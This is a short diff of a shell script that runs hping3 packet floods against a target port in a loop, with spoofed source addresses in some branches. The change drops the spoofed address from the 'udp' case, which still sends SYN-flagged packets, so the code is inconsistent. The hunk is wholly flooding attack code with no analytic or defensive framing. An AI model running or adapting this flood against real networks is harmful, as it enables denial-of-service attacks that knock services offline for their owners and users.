@@ -37,7 +37,7 @@ while true; do
 
   case "$packet_type" in
     udp)
-      hping3 -c 10000 -d "$packet_size" -S --flood -p "$target_port" $spoofed_ip --interface eth1 $gateway_ip
+      hping3 -c 10000 -d "$packet_size" -S --flood -p "$target_port" --interface eth1 $gateway_ip
       ;;
     syn)
       hping3 -c 10000 -d "$packet_size" --syn --flood -p "$target_port" --interface eth1 $spoofed_ip 
